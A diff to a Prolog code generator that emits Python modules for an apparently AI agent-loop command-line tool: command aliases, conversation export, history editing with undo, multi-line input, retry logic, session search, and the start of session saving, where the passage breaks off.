@@ -429,6 +429,19 @@ generate_all :-
     generate_module(config),
     generate_module(display),
     generate_module(tools),
+    generate_module(aliases),
+    generate_module(export),
+    generate_module(history),
+    generate_module(multiline),
+    generate_module(retry),
+    generate_module(search),
+    generate_module(sessions),
+    generate_module(skills),
+    generate_module(templates),
+    generate_module(security_audit),
+    generate_module(security_proxy),
+    generate_module(security_path_proxy),
+    generate_module(security_proot_sandbox),
     generate_module(readme),
     write('Done.'), nl.
 
@@ -443,7 +456,29 @@ generate_module(context)            :- generate_context.
 generate_module(config)             :- generate_config.
 generate_module(display)            :- generate_display.
 generate_module(tools)              :- generate_tools_module.
+generate_module(aliases)            :- generate_simple_module('aliases.py', aliases_module).
+generate_module(export)             :- generate_simple_module('export.py', export_module).
+generate_module(history)            :- generate_simple_module('history.py', history_module).
+generate_module(multiline)          :- generate_simple_module('multiline.py', multiline_module).
+generate_module(retry)              :- generate_simple_module('retry.py', retry_module).
+generate_module(search)             :- generate_simple_module('search.py', search_module).
+generate_module(sessions)           :- generate_simple_module('sessions.py', sessions_module).
+generate_module(skills)             :- generate_simple_module('skills.py', skills_module).
+generate_module(templates)          :- generate_simple_module('templates.py', templates_module).
+generate_module(security_audit)     :- generate_simple_module('security/audit.py', security_audit_module).
+generate_module(security_proxy)     :- generate_simple_module('security/proxy.py', security_proxy_module).
+generate_module(security_path_proxy):- generate_simple_module('security/path_proxy.py', security_path_proxy_module).
+generate_module(security_proot_sandbox) :- generate_simple_module('security/proot_sandbox.py', security_proot_sandbox_module).
 generate_module(readme)             :- generate_readme.
+
+%% Simple module generator: write a single py_fragment to a file
+generate_simple_module(FileName, FragmentName) :-
+    atom_concat('generated/', FileName, Path),
+    open(Path, write, S),
+    write_py(S, FragmentName),
+    close(S),
+    %% Extract just the filename for display
+    format('  Generated ~w~n', [FileName]).
 
 %% =============================================================================
 %% Generator: backends/__init__.py
@@ -3203,6 +3238,2531 @@ py_fragment(tools_handler_class, 'class ToolHandler:
 ').
 
 %% =============================================================================
+py_fragment(aliases_module, '"""Command aliases for the agent loop."""
+
+import json
+from pathlib import Path
+from typing import Callable
+
+
+# Default aliases
+DEFAULT_ALIASES = {
+    # Short forms
+    "q": "quit",
+    "x": "exit",
+    "h": "help",
+    "?": "help",
+    "c": "clear",
+    "s": "status",
+
+    # Save/load shortcuts
+    "sv": "save",
+    "ld": "load",
+    "ls": "sessions",
+
+    # Export shortcuts
+    "exp": "export",
+    "md": "export conversation.md",
+    "html": "export conversation.html",
+
+    # Backend shortcuts
+    "be": "backend",
+    "sw": "backend",  # switch
+
+    # Common backend switches
+    "yolo": "backend yolo",
+    "opus": "backend claude-opus",
+    "sonnet": "backend claude-sonnet",
+    "haiku": "backend claude-haiku",
+    "gpt": "backend openai",
+    "local": "backend ollama",
+
+    # Format shortcuts
+    "fmt": "format",
+
+    # Iteration shortcuts
+    "iter": "iterations",
+    "i0": "iterations 0",
+    "i1": "iterations 1",
+    "i3": "iterations 3",
+    "i5": "iterations 5",
+
+    # Stream toggle
+    "str": "stream",
+
+    # Cost
+    "$": "cost",
+
+    # Search
+    "find": "search",
+    "grep": "search",
+}
+
+
+class AliasManager:
+    """Manages command aliases."""
+
+    def __init__(self, config_path: str | Path | None = None):
+        self.aliases = DEFAULT_ALIASES.copy()
+        self.config_path = Path(config_path) if config_path else self._default_config_path()
+        self._load_user_aliases()
+
+    def _default_config_path(self) -> Path:
+        return Path.home() / ".agent-loop" / "aliases.json"
+
+    def _load_user_aliases(self) -> None:
+        """Load user-defined aliases from config file."""
+        if self.config_path.exists():
+            try:
+                data = json.loads(self.config_path.read_text())
+                self.aliases.update(data)
+            except (json.JSONDecodeError, IOError):
+                pass
+
+    def save_aliases(self) -> None:
+        """Save current aliases to config file."""
+        self.config_path.parent.mkdir(parents=True, exist_ok=True)
+        # Only save non-default aliases
+        user_aliases = {
+            k: v for k, v in self.aliases.items()
+            if k not in DEFAULT_ALIASES or DEFAULT_ALIASES.get(k) != v
+        }
+        self.config_path.write_text(json.dumps(user_aliases, indent=2))
+
+    def resolve(self, command: str) -> str:
+        """Resolve an alias to its full command.
+
+        Returns the original command if no alias found.
+        """
+        # Handle slash prefix
+        if command.startswith(\'/\'):
+            cmd = command[1:]
+            prefix = \'/\'
+        else:
+            cmd = command
+            prefix = \'\'
+
+        # Check for exact alias match (first word only)
+        parts = cmd.split(None, 1)
+        if parts:
+            first_word = parts[0].lower()
+            if first_word in self.aliases:
+                # Replace first word with alias expansion
+                expanded = self.aliases[first_word]
+                if len(parts) > 1:
+                    # Append any additional arguments
+                    expanded = f"{expanded} {parts[1]}"
+                return prefix + expanded
+
+        return command
+
+    def add(self, alias: str, command: str) -> None:
+        """Add or update an alias."""
+        self.aliases[alias.lower()] = command
+
+    def remove(self, alias: str) -> bool:
+        """Remove an alias. Returns True if removed."""
+        alias = alias.lower()
+        if alias in self.aliases:
+            del self.aliases[alias]
+            return True
+        return False
+
+    def list_aliases(self) -> list[tuple[str, str]]:
+        """List all aliases sorted by name."""
+        return sorted(self.aliases.items())
+
+    def format_list(self) -> str:
+        """Format aliases for display."""
+        lines = ["Aliases:"]
+
+        # Group by category
+        categories = {
+            "Navigation": ["q", "x", "h", "?", "c", "s"],
+            "Sessions": ["sv", "ld", "ls"],
+            "Export": ["exp", "md", "html"],
+            "Backend": ["be", "sw", "yolo", "opus", "sonnet", "haiku", "gpt", "local"],
+            "Iterations": ["iter", "i0", "i1", "i3", "i5"],
+            "Other": ["fmt", "str", "$", "find", "grep"],
+        }
+
+        for category, keys in categories.items():
+            cat_aliases = [(k, self.aliases[k]) for k in keys if k in self.aliases]
+            if cat_aliases:
+                lines.append(f"\\n  {category}:")
+                for alias, cmd in cat_aliases:
+                    lines.append(f"    /{alias} -> /{cmd}")
+
+        # User-defined aliases
+        user_aliases = [
+            (k, v) for k, v in self.aliases.items()
+            if k not in DEFAULT_ALIASES
+        ]
+        if user_aliases:
+            lines.append("\\n  User-defined:")
+            for alias, cmd in sorted(user_aliases):
+                lines.append(f"    /{alias} -> /{cmd}")
+
+        return "\\n".join(lines)
+
+
+def create_default_aliases_file(path: str | Path | None = None) -> Path:
+    """Create a default aliases file for user customization."""
+    path = Path(path) if path else Path.home() / ".agent-loop" / "aliases.json"
+    path.parent.mkdir(parents=True, exist_ok=True)
+
+    example = {
+        "# Comment": "Add your custom aliases here",
+        "myalias": "backend claude-opus",
+        "quick": "backend claude-haiku",
+    }
+    # Remove comment key
+    del example["# Comment"]
+
+    path.write_text(json.dumps(example, indent=2))
+    return path').
+
+py_fragment(export_module, '"""Export conversations to various formats."""
+
+from pathlib import Path
+from datetime import datetime
+from context import ContextManager
+
+
+class ConversationExporter:
+    """Export conversation history to different formats."""
+
+    def __init__(self, context: ContextManager):
+        self.context = context
+
+    def to_markdown(self, title: str = "Conversation") -> str:
+        """Export conversation to Markdown format."""
+        lines = [
+            f"# {title}",
+            "",
+            f"*Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}*",
+            f"*Messages: {self.context.message_count} | Tokens: {self.context.token_count}*",
+            "",
+            "---",
+            ""
+        ]
+
+        for msg in self.context.messages:
+            role = "**You:**" if msg.role == "user" else "**Assistant:**"
+            lines.append(role)
+            lines.append("")
+            lines.append(msg.content)
+            lines.append("")
+
+        return "\\n".join(lines)
+
+    def to_html(self, title: str = "Conversation") -> str:
+        """Export conversation to HTML format."""
+        messages_html = []
+
+        for msg in self.context.messages:
+            role_class = "user" if msg.role == "user" else "assistant"
+            role_label = "You" if msg.role == "user" else "Assistant"
+            # Escape HTML and preserve newlines
+            content = self._escape_html(msg.content).replace("\\n", "<br>")
+            messages_html.append(f\'\'\'
+        <div class="message {role_class}">
+            <div class="role">{role_label}</div>
+            <div class="content">{content}</div>
+        </div>\'\'\')
+
+        return f\'\'\'<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{self._escape_html(title)}</title>
+    <style>
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, \'Segoe UI\', Roboto, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }}
+        h1 {{
+            color: #333;
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 10px;
+        }}
+        .meta {{
+            color: #666;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+        }}
+        .message {{
+            margin: 15px 0;
+            padding: 15px;
+            border-radius: 8px;
+        }}
+        .message.user {{
+            background: #e3f2fd;
+            margin-left: 20px;
+        }}
+        .message.assistant {{
+            background: #fff;
+            border: 1px solid #ddd;
+            margin-right: 20px;
+        }}
+        .role {{
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #555;
+        }}
+        .content {{
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }}
+        code {{
+            background: #f0f0f0;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: \'Consolas\', \'Monaco\', monospace;
+        }}
+        pre {{
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }}
+    </style>
+</head>
+<body>
+    <h1>{self._escape_html(title)}</h1>
+    <div class="meta">
+        Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')} |
+        Messages: {self.context.message_count} |
+        Tokens: {self.context.token_count}
+    </div>
+    {"".join(messages_html)}
+</body>
+</html>\'\'\'
+
+    def to_json(self) -> str:
+        """Export conversation to JSON format."""
+        import json
+        data = {
+            "exported": datetime.now().isoformat(),
+            "message_count": self.context.message_count,
+            "token_count": self.context.token_count,
+            "messages": [
+                {
+                    "role": msg.role,
+                    "content": msg.content,
+                    "tokens": msg.tokens
+                }
+                for msg in self.context.messages
+            ]
+        }
+        return json.dumps(data, indent=2)
+
+    def to_text(self) -> str:
+        """Export conversation to plain text format."""
+        lines = [
+            f"Conversation Export",
+            f"Exported: {datetime.now().strftime(\'%Y-%m-%d %H:%M:%S\')}",
+            f"Messages: {self.context.message_count} | Tokens: {self.context.token_count}",
+            "",
+            "=" * 60,
+            ""
+        ]
+
+        for msg in self.context.messages:
+            role = "You:" if msg.role == "user" else "Assistant:"
+            lines.append(role)
+            lines.append(msg.content)
+            lines.append("")
+            lines.append("-" * 40)
+            lines.append("")
+
+        return "\\n".join(lines)
+
+    def save(self, path: str | Path, format: str = "auto", title: str = "Conversation") -> None:
+        """Save conversation to file.
+
+        Args:
+            path: Output file path
+            format: Export format (\'markdown\', \'html\', \'json\', \'text\', \'auto\')
+            title: Title for the export
+        """
+        path = Path(path)
+
+        # Auto-detect format from extension
+        if format == "auto":
+            ext = path.suffix.lower()
+            format_map = {
+                ".md": "markdown",
+                ".html": "html",
+                ".htm": "html",
+                ".json": "json",
+                ".txt": "text"
+            }
+            format = format_map.get(ext, "markdown")
+
+        # Generate content
+        if format == "markdown":
+            content = self.to_markdown(title)
+        elif format == "html":
+            content = self.to_html(title)
+        elif format == "json":
+            content = self.to_json()
+        else:
+            content = self.to_text()
+
+        path.write_text(content)
+
+    def _escape_html(self, text: str) -> str:
+        """Escape HTML special characters."""
+        return (text
+                .replace("&", "&amp;")
+                .replace("<", "&lt;")
+                .replace(">", "&gt;")
+                .replace(\'"\', "&quot;"))').
+
+py_fragment(history_module, '"""Conversation history management with edit/delete support."""
+
+from dataclasses import dataclass
+from typing import Literal
+from context import ContextManager, Message
+
+
+@dataclass
+class HistoryEntry:
+    """A numbered entry in the conversation history."""
+    index: int
+    role: str
+    content: str
+    tokens: int
+    truncated: bool = False
+
+
+class HistoryManager:
+    """Manages conversation history with edit/delete capabilities."""
+
+    def __init__(self, context: ContextManager):
+        self.context = context
+        self._undo_stack: list[list[Message]] = []
+        self._max_undo = 10
+
+    def get_entries(self, limit: int = 20) -> list[HistoryEntry]:
+        """Get recent history entries with indices."""
+        entries = []
+        messages = self.context.messages[-limit:] if limit else self.context.messages
+        start_idx = len(self.context.messages) - len(messages)
+
+        for i, msg in enumerate(messages):
+            content = msg.content
+            truncated = False
+            if len(content) > 100:
+                content = content[:97] + "..."
+                truncated = True
+
+            entries.append(HistoryEntry(
+                index=start_idx + i,
+                role=msg.role,
+                content=content,
+                tokens=msg.tokens,
+                truncated=truncated
+            ))
+
+        return entries
+
+    def format_history(self, limit: int = 10) -> str:
+        """Format history for display."""
+        entries = self.get_entries(limit)
+        if not entries:
+            return "No messages in history."
+
+        lines = [f"Last {len(entries)} messages:"]
+        for e in entries:
+            role = "You" if e.role == "user" else "Asst"
+            # Show first line only, truncated
+            first_line = e.content.split(\'\\n\')[0]
+            if len(first_line) > 60:
+                first_line = first_line[:57] + "..."
+            lines.append(f"  [{e.index}] {role}: {first_line}")
+
+        return "\\n".join(lines)
+
+    def get_message(self, index: int) -> Message | None:
+        """Get a message by index."""
+        if 0 <= index < len(self.context.messages):
+            return self.context.messages[index]
+        return None
+
+    def get_full_content(self, index: int) -> str | None:
+        """Get full content of a message by index."""
+        msg = self.get_message(index)
+        return msg.content if msg else None
+
+    def edit_message(self, index: int, new_content: str) -> bool:
+        """Edit a message\'s content."""
+        if not 0 <= index < len(self.context.messages):
+            return False
+
+        # Save state for undo
+        self._save_state()
+
+        # Edit the message
+        old_msg = self.context.messages[index]
+        self.context.messages[index] = Message(
+            role=old_msg.role,
+            content=new_content,
+            tokens=old_msg.tokens  # Keep original token count
+        )
+        return True
+
+    def delete_message(self, index: int) -> bool:
+        """Delete a message by index."""
+        if not 0 <= index < len(self.context.messages):
+            return False
+
+        # Save state for undo
+        self._save_state()
+
+        # Remove the message
+        removed = self.context.messages.pop(index)
+        self.context._token_count -= removed.tokens
+        return True
+
+    def delete_range(self, start: int, end: int) -> int:
+        """Delete a range of messages [start, end]. Returns count deleted."""
+        if start < 0:
+            start = 0
+        if end >= len(self.context.messages):
+            end = len(self.context.messages) - 1
+        if start > end:
+            return 0
+
+        # Save state for undo
+        self._save_state()
+
+        # Remove messages in reverse order to preserve indices
+        count = 0
+        for i in range(end, start - 1, -1):
+            if 0 <= i < len(self.context.messages):
+                removed = self.context.messages.pop(i)
+                self.context._token_count -= removed.tokens
+                count += 1
+
+        return count
+
+    def delete_last(self, n: int = 1) -> int:
+        """Delete the last N messages. Returns count deleted."""
+        if n <= 0:
+            return 0
+
+        # Save state for undo
+        self._save_state()
+
+        count = 0
+        for _ in range(n):
+            if self.context.messages:
+                removed = self.context.messages.pop()
+                self.context._token_count -= removed.tokens
+                count += 1
+
+        return count
+
+    def undo(self) -> bool:
+        """Undo the last edit/delete operation."""
+        if not self._undo_stack:
+            return False
+
+        # Restore previous state
+        self.context.messages = self._undo_stack.pop()
+        self.context._token_count = sum(m.tokens for m in self.context.messages)
+        return True
+
+    def _save_state(self) -> None:
+        """Save current state for undo."""
+        # Deep copy messages
+        state = [
+            Message(role=m.role, content=m.content, tokens=m.tokens)
+            for m in self.context.messages
+        ]
+        self._undo_stack.append(state)
+
+        # Limit undo stack size
+        while len(self._undo_stack) > self._max_undo:
+            self._undo_stack.pop(0)
+
+    def can_undo(self) -> bool:
+        """Check if undo is available."""
+        return len(self._undo_stack) > 0
+
+    def truncate_after(self, index: int) -> int:
+        """Delete all messages after index. Returns count deleted."""
+        if index < 0 or index >= len(self.context.messages) - 1:
+            return 0
+
+        # Save state for undo
+        self._save_state()
+
+        count = 0
+        while len(self.context.messages) > index + 1:
+            removed = self.context.messages.pop()
+            self.context._token_count -= removed.tokens
+            count += 1
+
+        return count
+
+    def replay_from(self, index: int) -> str | None:
+        """Get the user message at index for replay.
+
+        Truncates history after that point so the message can be re-sent.
+        """
+        msg = self.get_message(index)
+        if msg is None or msg.role != "user":
+            return None
+
+        # Get the content before truncating
+        content = msg.content
+
+        # Truncate to just before this message
+        self.truncate_after(index - 1)
+
+        return content').
+
+py_fragment(multiline_module, '"""Multi-line input support for the agent loop."""
+
+import select
+import sys
+
+
+def _read_pasted_lines(first_line: str, timeout: float = 0.05) -> str:
+    """After reading first_line via input(), check for pasted continuation lines.
+
+    Uses select() with a short timeout to detect if more data arrived on stdin
+    in rapid succession (i.e. a paste, not typing).
+    """
+    lines = [first_line]
+    try:
+        while True:
+            ready, _, _ = select.select([sys.stdin], [], [], timeout)
+            if not ready:
+                break
+            line = sys.stdin.readline()
+            if not line:
+                break
+            lines.append(line.rstrip(\'\\n\'))
+    except (OSError, ValueError):
+        pass
+    return \'\\n\'.join(lines)
+
+
+def get_multiline_input(prompt: str = "You: ", end_marker: str = "EOF") -> str | None:
+    """Get multi-line input from the user.
+
+    Input ends when:
+    - User enters the end_marker on its own line (default: EOF)
+    - User presses Ctrl+D (EOF)
+    - User enters a blank line after text (optional quick mode)
+
+    Returns None on true EOF (Ctrl+D with no input).
+    """
+    print(f"{prompt}(multi-line mode, enter \'{end_marker}\' or Ctrl+D to finish)")
+    lines = []
+
+    try:
+        while True:
+            line = input()
+            if line.strip() == end_marker:
+                break
+            lines.append(line)
+    except EOFError:
+        if not lines:
+            return None
+
+    return "\\n".join(lines)
+
+
+def get_input_smart(prompt: str = "You: ") -> str | None:
+    """Smart input that detects when multi-line is needed.
+
+    Detection order:
+    1. Paste detection (if tty) — captures all pasted lines immediately
+    2. If single line, check triggers: ```, <<<, \\\\, {/[/(
+
+    Returns None on EOF.
+    """
+    try:
+        line = input(prompt)
+    except EOFError:
+        return None
+
+    if not line:
+        return ""
+
+    # Paste detection first — if multiple lines arrived, return them all
+    if sys.stdin.isatty():
+        pasted = _read_pasted_lines(line)
+        if \'\\n\' in pasted:
+            return pasted
+        # Single line — fall through to trigger checks
+
+    stripped = line.strip()
+
+    # Check for multi-line triggers (only for typed single lines)
+    if stripped.startswith("```"):
+        # Code block mode - read until closing ```
+        lines = [line]
+        try:
+            while True:
+                next_line = input()
+                lines.append(next_line)
+                if next_line.strip() == "```" or next_line.strip().startswith("```"):
+                    break
+        except EOFError:
+            pass
+        return "\\n".join(lines)
+
+    if stripped.startswith("<<<"):
+        # Heredoc mode - read until marker
+        marker = stripped[3:].strip() or "EOF"
+        lines = []
+        print(f"(enter \'{marker}\' to finish)")
+        try:
+            while True:
+                next_line = input()
+                if next_line.strip() == marker:
+                    break
+                lines.append(next_line)
+        except EOFError:
+            pass
+        return "\\n".join(lines)
+
+    if stripped.endswith("\\\\"):
+        # Line continuation mode
+        lines = [line.rstrip("\\\\")]
+        try:
+            while True:
+                next_line = input("... ")
+                if next_line.endswith("\\\\"):
+                    lines.append(next_line.rstrip("\\\\"))
+                else:
+                    lines.append(next_line)
+                    break
+        except EOFError:
+            pass
+        return "\\n".join(lines)
+
+    if stripped in (\'{\', \'[\', \'(\'):
+        # Data structure mode - read until matching close
+        open_char = stripped
+        close_char = {\'{\': \'}\', \'[\': \']\', \'(\': \')\'}[open_char]
+        lines = [line]
+        depth = 1
+        print(f"(enter until matching \'{close_char}\')")
+        try:
+            while depth > 0:
+                next_line = input("... ")
+                lines.append(next_line)
+                # Simple depth tracking (doesn\'t handle strings properly)
+                depth += next_line.count(open_char) - next_line.count(close_char)
+        except EOFError:
+            pass
+        return "\\n".join(lines)
+
+    return line
+
+
+class MultilineInputHandler:
+    """Handles multi-line input with various modes."""
+
+    def __init__(
+        self,
+        prompt: str = "You: ",
+        continuation_prompt: str = "... ",
+        end_marker: str = "EOF"
+    ):
+        self.prompt = prompt
+        self.continuation_prompt = continuation_prompt
+        self.end_marker = end_marker
+        self.multiline_mode = False
+
+    def get_input(self) -> str | None:
+        """Get input, handling multi-line when needed."""
+        if self.multiline_mode:
+            return self._get_explicit_multiline()
+        return get_input_smart(self.prompt)
+
+    def _get_explicit_multiline(self) -> str | None:
+        """Get multi-line input in explicit mode."""
+        return get_multiline_input(self.prompt, self.end_marker)
+
+    def toggle_multiline(self) -> bool:
+        """Toggle explicit multi-line mode. Returns new state."""
+        self.multiline_mode = not self.multiline_mode
+        return self.multiline_mode
+
+
+def paste_mode() -> str:
+    """Enter paste mode for pasting large blocks of text.
+
+    Reads all input until Ctrl+D without any processing.
+    """
+    print("Paste mode: paste your text, then press Ctrl+D")
+    lines = []
+    try:
+        while True:
+            line = sys.stdin.readline()
+            if not line:  # EOF
+                break
+            lines.append(line.rstrip(\'\\n\'))
+    except KeyboardInterrupt:
+        pass
+
+    return "\\n".join(lines)').
+
+py_fragment(retry_module, '"""Retry logic for transient failures."""
+
+import time
+import random
+from typing import Callable, TypeVar, Any
+from functools import wraps
+
+T = TypeVar("T")
+
+
+class RetryError(Exception):
+    """Raised when all retry attempts fail."""
+
+    def __init__(self, message: str, last_error: Exception, attempts: int):
+        super().__init__(message)
+        self.last_error = last_error
+        self.attempts = attempts
+
+
+def retry(
+    max_attempts: int = 3,
+    base_delay: float = 1.0,
+    max_delay: float = 60.0,
+    exponential_base: float = 2.0,
+    jitter: bool = True,
+    retryable_exceptions: tuple = (Exception,),
+    on_retry: Callable[[Exception, int, float], None] | None = None
+) -> Callable:
+    """Decorator for retrying functions with exponential backoff.
+
+    Args:
+        max_attempts: Maximum number of attempts (including first try)
+        base_delay: Initial delay between retries in seconds
+        max_delay: Maximum delay between retries
+        exponential_base: Base for exponential backoff
+        jitter: Add random jitter to delays
+        retryable_exceptions: Tuple of exception types to retry on
+        on_retry: Callback called before each retry (exception, attempt, delay)
+
+    Example:
+        @retry(max_attempts=3, base_delay=1.0)
+        def call_api():
+            return requests.get(url)
+    """
+    def decorator(func: Callable[..., T]) -> Callable[..., T]:
+        @wraps(func)
+        def wrapper(*args, **kwargs) -> T:
+            last_exception = None
+
+            for attempt in range(1, max_attempts + 1):
+                try:
+                    return func(*args, **kwargs)
+                except retryable_exceptions as e:
+                    last_exception = e
+
+                    if attempt == max_attempts:
+                        raise RetryError(
+                            f"Failed after {max_attempts} attempts: {e}",
+                            last_error=e,
+                            attempts=max_attempts
+                        )
+
+                    # Calculate delay with exponential backoff
+                    delay = min(
+                        base_delay * (exponential_base ** (attempt - 1)),
+                        max_delay
+                    )
+
+                    # Add jitter
+                    if jitter:
+                        delay = delay * (0.5 + random.random())
+
+                    # Call retry callback
+                    if on_retry:
+                        on_retry(e, attempt, delay)
+
+                    time.sleep(delay)
+
+            # Should never reach here, but just in case
+            raise RetryError(
+                f"Failed after {max_attempts} attempts",
+                last_error=last_exception,
+                attempts=max_attempts
+            )
+
+        return wrapper
+    return decorator
+
+
+def retry_call(
+    func: Callable[..., T],
+    args: tuple = (),
+    kwargs: dict | None = None,
+    max_attempts: int = 3,
+    base_delay: float = 1.0,
+    max_delay: float = 60.0,
+    exponential_base: float = 2.0,
+    jitter: bool = True,
+    retryable_exceptions: tuple = (Exception,),
+    on_retry: Callable[[Exception, int, float], None] | None = None
+) -> T:
+    """Call a function with retry logic.
+
+    Args:
+        func: Function to call
+        args: Positional arguments for the function
+        kwargs: Keyword arguments for the function
+        max_attempts: Maximum number of attempts
+        base_delay: Initial delay between retries
+        max_delay: Maximum delay between retries
+        exponential_base: Base for exponential backoff
+        jitter: Add random jitter to delays
+        retryable_exceptions: Tuple of exception types to retry on
+        on_retry: Callback called before each retry
+
+    Example:
+        result = retry_call(
+            requests.get,
+            args=(url,),
+            kwargs={"timeout": 10},
+            max_attempts=3
+        )
+    """
+    kwargs = kwargs or {}
+
+    @retry(
+        max_attempts=max_attempts,
+        base_delay=base_delay,
+        max_delay=max_delay,
+        exponential_base=exponential_base,
+        jitter=jitter,
+        retryable_exceptions=retryable_exceptions,
+        on_retry=on_retry
+    )
+    def wrapped():
+        return func(*args, **kwargs)
+
+    return wrapped()
+
+
+# Common retryable exception patterns for API calls
+API_RETRYABLE_ERRORS = (
+    ConnectionError,
+    TimeoutError,
+    OSError,
+)
+
+# For use with requests library
+def is_retryable_status(status_code: int) -> bool:
+    """Check if an HTTP status code is retryable."""
+    return status_code in (
+        408,  # Request Timeout
+        429,  # Too Many Requests
+        500,  # Internal Server Error
+        502,  # Bad Gateway
+        503,  # Service Unavailable
+        504,  # Gateway Timeout
+    )
+
+
+class RetryableAPIError(Exception):
+    """Exception for retryable API errors."""
+
+    def __init__(self, message: str, status_code: int | None = None):
+        super().__init__(message)
+        self.status_code = status_code').
+
+py_fragment(search_module, '"""Search across conversation sessions."""
+
+import json
+import re
+from pathlib import Path
+from dataclasses import dataclass
+from typing import Iterator
+
+
+@dataclass
+class SearchResult:
+    """A single search result."""
+    session_id: str
+    session_name: str
+    message_index: int
+    role: str
+    content: str
+    match_start: int
+    match_end: int
+    context_before: str
+    context_after: str
+
+    def format(self, max_width: int = 80) -> str:
+        """Format result for display."""
+        # Highlight the match
+        before = self.content[:self.match_start]
+        match = self.content[self.match_start:self.match_end]
+        after = self.content[self.match_end:]
+
+        # Truncate if too long
+        if len(before) > 30:
+            before = "..." + before[-27:]
+        if len(after) > 30:
+            after = after[:27] + "..."
+
+        snippet = f"{before}**{match}**{after}"
+
+        return f"[{self.session_id}] {self.role}: {snippet}"
+
+
+class SessionSearcher:
+    """Search through saved conversation sessions."""
+
+    def __init__(self, sessions_dir: str | Path):
+        self.sessions_dir = Path(sessions_dir)
+
+    def search(
+        self,
+        query: str,
+        case_sensitive: bool = False,
+        regex: bool = False,
+        role_filter: str | None = None,
+        limit: int = 50
+    ) -> list[SearchResult]:
+        """Search for a query across all sessions.
+
+        Args:
+            query: Search query (string or regex pattern)
+            case_sensitive: Whether search is case-sensitive
+            regex: Treat query as regex pattern
+            role_filter: Filter by role (\'user\' or \'assistant\')
+            limit: Maximum number of results
+
+        Returns:
+            List of SearchResult objects
+        """
+        results = []
+
+        # Compile pattern
+        flags = 0 if case_sensitive else re.IGNORECASE
+        if regex:
+            pattern = re.compile(query, flags)
+        else:
+            pattern = re.compile(re.escape(query), flags)
+
+        # Search each session
+        for session_path in self.sessions_dir.glob("*.json"):
+            try:
+                session_results = self._search_session(
+                    session_path, pattern, role_filter
+                )
+                results.extend(session_results)
+
+                if len(results) >= limit:
+                    break
+            except (json.JSONDecodeError, KeyError):
+                continue
+
+        return results[:limit]
+
+    def _search_session(
+        self,
+        session_path: Path,
+        pattern: re.Pattern,
+        role_filter: str | None
+    ) -> list[SearchResult]:
+        """Search within a single session file."""
+        results = []
+
+        data = json.loads(session_path.read_text())
+        session_id = data.get("metadata", {}).get("id", session_path.stem)
+        session_name = data.get("metadata", {}).get("name", "Unnamed")
+
+        for i, msg in enumerate(data.get("messages", [])):
+            role = msg.get("role", "unknown")
+            content = msg.get("content", "")
+
+            # Apply role filter
+            if role_filter and role != role_filter:
+                continue
+
+            # Find all matches in this message
+            for match in pattern.finditer(content):
+                # Extract context
+                start = max(0, match.start() - 50)
+                end = min(len(content), match.end() + 50)
+
+                results.append(SearchResult(
+                    session_id=session_id,
+                    session_name=session_name,
+                    message_index=i,
+                    role=role,
+                    content=content,
+                    match_start=match.start(),
+                    match_end=match.end(),
+                    context_before=content[start:match.start()],
+                    context_after=content[match.end():end]
+                ))
+
+        return results
+
+    def search_in_session(
+        self,
+        session_id: str,
+        query: str,
+        case_sensitive: bool = False
+    ) -> list[SearchResult]:
+        """Search within a specific session."""
+        session_path = self.sessions_dir / f"{session_id}.json"
+        if not session_path.exists():
+            return []
+
+        flags = 0 if case_sensitive else re.IGNORECASE
+        pattern = re.compile(re.escape(query), flags)
+
+        return self._search_session(session_path, pattern, None)
+
+    def list_sessions_containing(
+        self,
+        query: str,
+        case_sensitive: bool = False
+    ) -> list[dict]:
+        """List sessions that contain a query (without full results)."""
+        flags = 0 if case_sensitive else re.IGNORECASE
+        pattern = re.compile(re.escape(query), flags)
+
+        sessions = []
+
+        for session_path in self.sessions_dir.glob("*.json"):
+            try:
+                data = json.loads(session_path.read_text())
+                messages = data.get("messages", [])
+
+                # Check if any message matches
+                match_count = 0
+                for msg in messages:
+                    content = msg.get("content", "")
+                    match_count += len(pattern.findall(content))
+
+                if match_count > 0:
+                    metadata = data.get("metadata", {})
+                    sessions.append({
+                        "id": metadata.get("id", session_path.stem),
+                        "name": metadata.get("name", "Unnamed"),
+                        "match_count": match_count,
+                        "message_count": len(messages)
+                    })
+            except (json.JSONDecodeError, KeyError):
+                continue
+
+        # Sort by match count
+        sessions.sort(key=lambda x: x["match_count"], reverse=True)
+        return sessions
+
+    def get_session_stats(self) -> dict:
+        """Get statistics about all sessions."""
+        total_sessions = 0
+        total_messages = 0
+        total_tokens = 0
+
+        for session_path in self.sessions_dir.glob("*.json"):
+            try:
+                data = json.loads(session_path.read_text())
+                total_sessions += 1
+                messages = data.get("messages", [])
+                total_messages += len(messages)
+                total_tokens += sum(m.get("tokens", 0) for m in messages)
+            except (json.JSONDecodeError, KeyError):
+                continue
+
+        return {
+            "total_sessions": total_sessions,
+            "total_messages": total_messages,
+            "total_tokens": total_tokens
+        }').
+
+py_fragment(sessions_module, '"""Session persistence for saving and loading conversations."""
+
+import json
+from pathlib import Path
+from datetime import datetime
+from dataclasses import dataclass, asdict
+from typing import Any
+
+from context import ContextManager, Message, ContextBehavior, ContextFormat
+
+
+@dataclass
+class SessionMetadata:
+    """Metadata about a saved session."""
+    id: str
+    name: str
+    created: str
+    modified: str
+    backend: str
+    message_count: int
+    token_count: int
+
+
+class SessionManager:
+    """Manages saving and loading conversation sessions."""
+
+    def __init__(self, sessions_dir: str | Path | None = None):
+        if sessions_dir is None:
+            # Default to ~/.agent-loop/sessions
+            sessions_dir = Path.home() / ".agent-loop" / "sessions"
+        self.sessions_dir = Path(sessions_dir)
+        self.sessions_dir.mkdir(parents=True, exist_ok=True)
+
+    def save_session(
+        self,
+        context: ContextManager,
+        session_id: str | None = None,
+        name: str | None = None,
+        backend_name: str = "unknown",
+        extra: dict | None = None
+    ) -> str:
+        """Save a conversation session to disk.
+
+        Returns the session ID.
+        """
+        # Generate session ID if not provided
+        if session_id is None:
